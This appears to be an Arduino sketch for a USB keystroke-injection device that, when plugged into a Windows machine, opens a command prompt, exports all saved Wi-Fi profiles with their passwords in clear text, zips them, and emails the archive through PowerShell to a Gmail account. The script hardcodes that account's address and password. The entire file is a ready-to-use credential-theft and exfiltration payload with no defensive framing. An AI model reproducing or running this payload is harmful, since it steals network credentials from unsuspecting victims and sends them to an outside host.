#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("cmd");

  delay(500);

  typeKey(KEY_RETURN);

  delay(750);

  Keyboard.print("netsh wlan export profile key=clear > ./null");

  typeKey(KEY_RETURN);
  delay(750);

  Keyboard.print("mkdir WifiPasswords");

  typeKey(KEY_RETURN);

  delay(750);

  Keyboard.print("xcopy *.xml WifiPasswords");

  typeKey(KEY_RETURN);

  delay(750);

  Keyboard.print("powershell");

  typeKey(KEY_RETURN);

  delay(750);

  Keyboard.print("Compress-Archive -Path ./WifiPasswords/* -DestinationPath ./WifiPassword.zip");

  typeKey(KEY_RETURN);

  delay(750);

  Keyboard.print("$SMTPServer = 'jalvarezguerreos@gmail.com'");

  typeKey(KEY_RETURN);

  delay(750);

  Keyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");

  typeKey(KEY_RETURN);

  delay(750);

  Keyboard.print("$SMTPInfo.EnableSsl = $true");

  typeKey(KEY_RETURN);

  delay(750);

  Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('jalvarezguerreos@gmail.com','@@looogger96@@');");

  typeKey(KEY_RETURN);

  delay(750);

  Keyboard.print("$ReportEmail = New-Object System.Net.Mail.MailMessage");

  typeKey(KEY_RETURN);

  delay(750);

  Keyboard.print("$ReportEmail.From = 'jalvarezguerreos@gmail.com'");

  typeKey(KEY_RETURN);

  delay(750);

  Keyboard.print("$ReportEmail.To.Add('jalvarezguerreos@gmail.com')");

  typeKey(KEY_RETURN);

  delay(750);

  Keyboard.print("$ReportEmail.Subject = 'Ducky chrome password'");

  typeKey(KEY_RETURN);

  delay(750);

  Keyboard.print("$ReportEmail.Attachments.Add('./WifiPassword.zip')");

  typeKey(KEY_RETURN);

  delay(750);

  Keyboard.print("$SMTPInfo.Send($ReportEmail)");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
